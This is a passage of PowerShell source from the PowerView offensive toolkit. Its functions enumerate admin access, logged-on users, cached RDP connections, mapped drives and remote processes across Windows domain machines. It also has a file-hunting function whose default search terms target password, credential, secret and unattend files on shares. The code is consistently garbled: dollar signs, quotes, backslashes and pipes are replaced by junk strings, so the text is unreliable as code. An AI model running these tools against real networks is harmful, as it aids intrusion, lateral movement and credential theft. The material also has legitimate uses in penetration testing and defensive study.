the current user has local admin rights, along with the ComputerName added.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType(q4gUPowerView.AdminAccessq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            RaUHandle = RaUAdvapi32::OpenSCManagerW(Oj8XScKjScKjRaUComputerOj8X, q4gUServicesActiveq4gU, 0xF003F);RaULastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            RaUIsAdmin = New-Object PSObject
            RaUIsAdmin wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer

            # if we get a non-zero handle back, everything was successful
            if (RaUHandle -ne 0) {
                RaUNull = RaUAdvapi32::CloseServiceHandle(RaUHandle)
                RaUIsAdmin wZ5t Add-Member Noteproperty q4gUIsAdminq4gU RaUTrue
            }
            else {
                Write-Verbose Oj8X[Test-AdminAccess] Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
                RaUIsAdmin wZ5t Add-Member Noteproperty q4gUIsAdminq4gU RaUFalse
            }
            RaUIsAdmin.PSObject.TypeNames.Insert(0, q4gUPowerView.AdminAccessq4gU)
            RaUIsAdmin
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-NetComputerSiteName {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer wZ5t Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential RaUCred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType(q4gUPowerView.ComputerSiteq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
            RaULogonToken = Invoke-UserImpersonation -Credential RaUCredential
        }
    }

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # if we get an IP address, try to resolve the IP to a hostname
            if (RaUComputer -match q4gU^(?:[0-9]{1,3}ScKj.){3}[0-9]{1,3}RaUq4gU) {
                RaUIPAddress = RaUComputer
                RaUComputer = [System.Net.Dns]::GetHostByAddress(RaUComputer) wZ5t Select-Object -ExpandProperty HostName
            }
            else {
                RaUIPAddress = @(Resolve-IPAddress -ComputerName RaUComputer)[0].IPAddress
            }

            RaUPtrInfo = [IntPtr]::Zero

            RaUResult = RaUNetapi32::DsGetSiteName(RaUComputer, [ref]RaUPtrInfo)

            RaUComputerSite = New-Object PSObject
            RaUComputerSite wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
            RaUComputerSite wZ5t Add-Member Noteproperty q4gUIPAddressq4gU RaUIPAddress

            if (RaUResult -eq 0) {
                RaUSitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(RaUPtrInfo)
                RaUComputerSite wZ5t Add-Member Noteproperty q4gUSiteNameq4gU RaUSitename
            }
            else {
                Write-Verbose Oj8X[Get-NetComputerSiteName] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
                RaUComputerSite wZ5t Add-Member Noteproperty q4gUSiteNameq4gU q4gUq4gU
            }
            RaUComputerSite.PSObject.TypeNames.Insert(0, q4gUPowerView.ComputerSiteq4gU)

            # free up the result buffer
            RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)

            RaUComputerSite
        }
    }

    END {
        if (RaULogonToken) {
            Invoke-RevertToSelf -TokenHandle RaULogonToken
        }
    }
}


function Get-WMIRegProxy {
<#
.SYNOPSIS

Enumerates the proxy server and WPAD conents for the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates the proxy server and WPAD specification for the current user
on the local machine (default), or a machine specified with -ComputerName.
It does this by enumerating settings from
HKU:SOFTWAREScKjMicrosoftScKjWindowsScKjCurrentVersionScKjInternet Settings.

.PARAMETER ComputerName

Specifies the system to enumerate proxy settings on. Defaults to the local host.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegProxy

ComputerName           ProxyServer            AutoConfigURL         Wpad
------------           -----------            -------------         ----
WINDOWS1               http://primary.test...

.EXAMPLE

RaUCred = Get-Credential Oj8XTESTLABScKjadministratorOj8X
Get-WMIRegProxy -Credential RaUCred -ComputerName primary.testlab.local

ComputerName            ProxyServer            AutoConfigURL         Wpad
------------            -----------            -------------         ----
windows1.testlab.local  primary.testlab.local

.INPUTS

String

Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).

.OUTPUTS

PowerView.ProxySettings

Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
#>

    [OutputType(q4gUPowerView.ProxySettingsq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = RaUEnv:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            try {
                RaUWmiArguments = @{
                    q4gUListq4gU = RaUTrue
                    q4gUClassq4gU = q4gUStdRegProvq4gU
                    q4gUNamespaceq4gU = q4gUrootScKjdefaultq4gU
                    q4gUComputernameq4gU = RaUComputer
                    q4gUErrorActionq4gU = q4gUStopq4gU
                }
                if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUWmiArguments[q4gUCredentialq4gU] = RaUCredential }

                RaURegProvider = Get-WmiObject @WmiArguments
                RaUKey = q4gUSOFTWAREScKjMicrosoftScKjWindowsScKjCurrentVersionScKjInternet Settingsq4gU

                # HKEY_CURRENT_USER
                RaUHKCU = 2147483649
                RaUProxyServer = RaURegProvider.GetStringValue(RaUHKCU, RaUKey, q4gUProxyServerq4gU).sValue
                RaUAutoConfigURL = RaURegProvider.GetStringValue(RaUHKCU, RaUKey, q4gUAutoConfigURLq4gU).sValue

                RaUWpad = q4gUq4gU
                if (RaUAutoConfigURL -and (RaUAutoConfigURL -ne q4gUq4gU)) {
                    try {
                        RaUWpad = (New-Object Net.WebClient).DownloadString(RaUAutoConfigURL)
                    }
                    catch {
                        Write-Warning Oj8X[Get-WMIRegProxy] Error connecting to AutoConfigURL : RaUAutoConfigURLOj8X
                    }
                }

                if (RaUProxyServer -or RaUAutoConfigUrl) {
                    RaUOut = New-Object PSObject
                    RaUOut wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaUOut wZ5t Add-Member Noteproperty q4gUProxyServerq4gU RaUProxyServer
                    RaUOut wZ5t Add-Member Noteproperty q4gUAutoConfigURLq4gU RaUAutoConfigURL
                    RaUOut wZ5t Add-Member Noteproperty q4gUWpadq4gU RaUWpad
                    RaUOut.PSObject.TypeNames.Insert(0, q4gUPowerView.ProxySettingsq4gU)
                    RaUOut
                }
                else {
                    Write-Warning Oj8X[Get-WMIRegProxy] No proxy settings found for RaUComputerNameOj8X
                }
            }
            catch {
                Write-Warning Oj8X[Get-WMIRegProxy] Error enumerating proxy settings for RaUComputerName : RaU_Oj8X
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine youq4gUre enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer wZ5t Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential RaUCred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType(q4gUPowerView.LastLoggedOnUserq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # HKEY_LOCAL_MACHINE
            RaUHKLM = 2147483650

            RaUWmiArguments = @{
                q4gUListq4gU = RaUTrue
                q4gUClassq4gU = q4gUStdRegProvq4gU
                q4gUNamespaceq4gU = q4gUrootScKjdefaultq4gU
                q4gUComputernameq4gU = RaUComputer
                q4gUErrorActionq4gU = q4gUSilentlyContinueq4gU
            }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUWmiArguments[q4gUCredentialq4gU] = RaUCredential }

            # try to open up the remote registry key to grab the last logged on user
            try {
                RaUReg = Get-WmiObject @WmiArguments

                RaUKey = q4gUSOFTWAREScKjMicrosoftScKjWindowsScKjCurrentVersionScKjAuthenticationScKjLogonUIq4gU
                RaUValue = q4gULastLoggedOnUserq4gU
                RaULastUser = RaUReg.GetStringValue(RaUHKLM, RaUKey, RaUValue).sValue

                RaULastLoggedOn = New-Object PSObject
                RaULastLoggedOn wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                RaULastLoggedOn wZ5t Add-Member Noteproperty q4gULastLoggedOnq4gU RaULastUser
                RaULastLoggedOn.PSObject.TypeNames.Insert(0, q4gUPowerView.LastLoggedOnUserq4gU)
                RaULastLoggedOn
            }
            catch {
                Write-Warning Oj8X[Get-WMIRegLastLoggedOn] Error opening remote registry on RaUComputer. Remote registry likely not enabled.Oj8X
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine youq4gUre enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
Oj8XWindows Remote Desktop Connection ClientOj8X on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnection

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer wZ5t Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential RaUCred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the ComputerName and cached RDP information.
#>

    [OutputType(q4gUPowerView.CachedRDPConnectionq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # HKEY_USERS
            RaUHKU = 2147483651

            RaUWmiArguments = @{
                q4gUListq4gU = RaUTrue
                q4gUClassq4gU = q4gUStdRegProvq4gU
                q4gUNamespaceq4gU = q4gUrootScKjdefaultq4gU
                q4gUComputernameq4gU = RaUComputer
                q4gUErrorActionq4gU = q4gUStopq4gU
            }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUWmiArguments[q4gUCredentialq4gU] = RaUCredential }

            try {
                RaUReg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                RaUUserSIDs = (RaUReg.EnumKey(RaUHKU, q4gUq4gU)).sNames wZ5t Where-Object { RaU_ -match q4gUS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+RaUq4gU }

                ForEach (RaUUserSID in RaUUserSIDs) {
                    try {
                        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                            RaUUserName = ConvertFrom-SID -ObjectSid RaUUserSID -Credential RaUCredential
                        }
                        else {
                            RaUUserName = ConvertFrom-SID -ObjectSid RaUUserSID
                        }

                        # pull out all the cached RDP connections
                        RaUConnectionKeys = RaUReg.EnumValues(RaUHKU,Oj8XRaUUserSIDScKjSoftwareScKjMicrosoftScKjTerminal Server ClientScKjDefaultOj8X).sNames

                        ForEach (RaUConnection in RaUConnectionKeys) {
                            # make sure this key is a cached connection
                            if (RaUConnection -match q4gUMRU.*q4gU) {
                                RaUTargetServer = RaUReg.GetStringValue(RaUHKU, Oj8XRaUUserSIDScKjSoftwareScKjMicrosoftScKjTerminal Server ClientScKjDefaultOj8X, RaUConnection).sValue

                                RaUFoundConnection = New-Object PSObject
                                RaUFoundConnection wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                                RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                                RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUserSIDq4gU RaUUserSID
                                RaUFoundConnection wZ5t Add-Member Noteproperty q4gUTargetServerq4gU RaUTargetServer
                                RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUsernameHintq4gU RaUNull
                                RaUFoundConnection.PSObject.TypeNames.Insert(0, q4gUPowerView.CachedRDPConnectionq4gU)
                                RaUFoundConnection
                            }
                        }

                        # pull out all the cached server info with username hints
                        RaUServerKeys = RaUReg.EnumKey(RaUHKU,Oj8XRaUUserSIDScKjSoftwareScKjMicrosoftScKjTerminal Server ClientScKjServersOj8X).sNames

                        ForEach (RaUServer in RaUServerKeys) {

                            RaUUsernameHint = RaUReg.GetStringValue(RaUHKU, Oj8XRaUUserSIDScKjSoftwareScKjMicrosoftScKjTerminal Server ClientScKjServersScKjRaUServerOj8X, q4gUUsernameHintq4gU).sValue

                            RaUFoundConnection = New-Object PSObject
                            RaUFoundConnection wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                            RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                            RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUserSIDq4gU RaUUserSID
                            RaUFoundConnection wZ5t Add-Member Noteproperty q4gUTargetServerq4gU RaUServer
                            RaUFoundConnection wZ5t Add-Member Noteproperty q4gUUsernameHintq4gU RaUUsernameHint
                            RaUFoundConnection.PSObject.TypeNames.Insert(0, q4gUPowerView.CachedRDPConnectionq4gU)
                            RaUFoundConnection
                        }
                    }
                    catch {
                        Write-Verbose Oj8X[Get-WMIRegCachedRDPConnection] Error: RaU_Oj8X
                    }
                }
            }
            catch {
                Write-Warning Oj8X[Get-WMIRegCachedRDPConnection] Error accessing RaUComputer, likely insufficient permissions or firewall rules on host: RaU_Oj8X
            }
        }
    }
}


function Get-WMIRegMountedDrive {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine youq4gUre enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer wZ5t Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential RaUCred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType(q4gUPowerView.RegMountedDriveq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            # HKEY_USERS
            RaUHKU = 2147483651

            RaUWmiArguments = @{
                q4gUListq4gU = RaUTrue
                q4gUClassq4gU = q4gUStdRegProvq4gU
                q4gUNamespaceq4gU = q4gUrootScKjdefaultq4gU
                q4gUComputernameq4gU = RaUComputer
                q4gUErrorActionq4gU = q4gUStopq4gU
            }
            if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUWmiArguments[q4gUCredentialq4gU] = RaUCredential }

            try {
                RaUReg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                RaUUserSIDs = (RaUReg.EnumKey(RaUHKU, q4gUq4gU)).sNames wZ5t Where-Object { RaU_ -match q4gUS-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+RaUq4gU }

                ForEach (RaUUserSID in RaUUserSIDs) {
                    try {
                        if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                            RaUUserName = ConvertFrom-SID -ObjectSid RaUUserSID -Credential RaUCredential
                        }
                        else {
                            RaUUserName = ConvertFrom-SID -ObjectSid RaUUserSID
                        }

                        RaUDriveLetters = (RaUReg.EnumKey(RaUHKU, Oj8XRaUUserSIDScKjNetworkOj8X)).sNames

                        ForEach (RaUDriveLetter in RaUDriveLetters) {
                            RaUProviderName = RaUReg.GetStringValue(RaUHKU, Oj8XRaUUserSIDScKjNetworkScKjRaUDriveLetterOj8X, q4gUProviderNameq4gU).sValue
                            RaURemotePath = RaUReg.GetStringValue(RaUHKU, Oj8XRaUUserSIDScKjNetworkScKjRaUDriveLetterOj8X, q4gURemotePathq4gU).sValue
                            RaUDriveUserName = RaUReg.GetStringValue(RaUHKU, Oj8XRaUUserSIDScKjNetworkScKjRaUDriveLetterOj8X, q4gUUserNameq4gU).sValue
                            if (-not RaUUserName) { RaUUserName = q4gUq4gU }

                            if (RaURemotePath -and (RaURemotePath -ne q4gUq4gU)) {
                                RaUMountedDrive = New-Object PSObject
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaUUserName
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUUserSIDq4gU RaUUserSID
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUDriveLetterq4gU RaUDriveLetter
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUProviderNameq4gU RaUProviderName
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gURemotePathq4gU RaURemotePath
                                RaUMountedDrive wZ5t Add-Member Noteproperty q4gUDriveUserNameq4gU RaUDriveUserName
                                RaUMountedDrive.PSObject.TypeNames.Insert(0, q4gUPowerView.RegMountedDriveq4gU)
                                RaUMountedDrive
                            }
                        }
                    }
                    catch {
                        Write-Verbose Oj8X[Get-WMIRegMountedDrive] Error: RaU_Oj8X
                    }
                }
            }
            catch {
                Write-Warning Oj8X[Get-WMIRegMountedDrive] Error accessing RaUComputer, likely insufficient permissions or firewall rules on host: RaU_Oj8X
            }
        }
    }
}


function Get-WMIProcess {
<#
.SYNOPSIS

Returns a list of processes and their owners on the local or remote machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Uses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,
including the owners of the particular process.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to q4gUlocalhostq4gU.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-WMIProcess -ComputerName WINDOWS1

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-WMIProcess -ComputerName PRIMARY.testlab.local -Credential RaUCred

.OUTPUTS

PowerView.UserProcess

A PSCustomObject containing the remote process information.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.UserProcessq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUHostNameq4gU, q4gUdnshostnameq4gU, q4gUnameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUComputerName = q4gUlocalhostq4gU,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach (RaUComputer in RaUComputerName) {
            try {
                RaUWmiArguments = @{
                    q4gUComputerNameq4gU = RaUComputerName
                    q4gUClassq4gU = q4gUWin32_processq4gU
                }
                if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUWmiArguments[q4gUCredentialq4gU] = RaUCredential }
                Get-WMIobject @WmiArguments wZ5t ForEach-Object {
                    RaUOwner = RaU_.getowner();
                    RaUProcess = New-Object PSObject
                    RaUProcess wZ5t Add-Member Noteproperty q4gUComputerNameq4gU RaUComputer
                    RaUProcess wZ5t Add-Member Noteproperty q4gUProcessNameq4gU RaU_.ProcessName
                    RaUProcess wZ5t Add-Member Noteproperty q4gUProcessIDq4gU RaU_.ProcessID
                    RaUProcess wZ5t Add-Member Noteproperty q4gUDomainq4gU RaUOwner.Domain
                    RaUProcess wZ5t Add-Member Noteproperty q4gUUserq4gU RaUOwner.User
                    RaUProcess.PSObject.TypeNames.Insert(0, q4gUPowerView.UserProcessq4gU)
                    RaUProcess
                }
            }
            catch {
                Write-Verbose Oj8X[Get-WMIProcess] Error enumerating remote processes on q4gURaUComputerq4gU, access likely denied: RaU_Oj8X
            }
        }
    }
}


function Find-InterestingFile {
<#
.SYNOPSIS

Searches for files on the given path that match a series of specified criteria.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection  

.DESCRIPTION

This function recursively searches a given UNC path for files with
specific keywords in the name (default of pass, sensitive, secret, admin,
login and unattend*.xml). By default, hidden files/folders are included
in search results. If -Credential is passed, Add-RemoteConnection/Remove-RemoteConnection
is used to temporarily map the remote share.

.PARAMETER Path

UNC/local path to recursively search.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER ExcludeFolders

Switch. Exclude folders from the search results.

.PARAMETER ExcludeHidden

Switch. Exclude hidden files and folders from the search results.

.PARAMETER CheckWriteAccess

Switch. Only returns files the current user has write access to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
to connect to remote systems for file enumeration.

.EXAMPLE

Find-InterestingFile -Path Oj8XC:ScKjBackupScKjOj8X

Returns any files on the local path C:ScKjBackupScKj that have the default
search term set in the title.

.EXAMPLE

Find-InterestingFile -Path Oj8XScKjScKjWINDOWS7ScKjUsersScKjOj8X -LastAccessTime (Get-Date).AddDays(-7)

Returns any files on the remote path ScKjScKjWINDOWS7ScKjUsersScKj that have the default
search term set in the title and were accessed within the last week.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Find-InterestingFile -Credential RaUCred -Path Oj8XScKjScKjPRIMARY.testlab.localScKjCRaUScKjTempScKjOj8X

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.FoundFileq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gUFileSpecificationq4gU)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUPath = q4gU.ScKjq4gU,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUSearchTermsq4gU, q4gUTermsq4gU)]
        [String[]]
        RaUInclude = @(q4gU*password*q4gU, q4gU*sensitive*q4gU, q4gU*admin*q4gU, q4gU*login*q4gU, q4gU*secret*q4gU, q4gUunattend*.xmlq4gU, q4gU*.vmdkq4gU, q4gU*creds*q4gU, q4gU*credential*q4gU, q4gU*.configq4gU),

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaULastAccessTime,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaULastWriteTime,

        [Parameter(ParameterSetName = q4gUFileSpecificationq4gU)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        RaUCreationTime,

        [Parameter(ParameterSetName = q4gUOfficeDocsq4gU)]
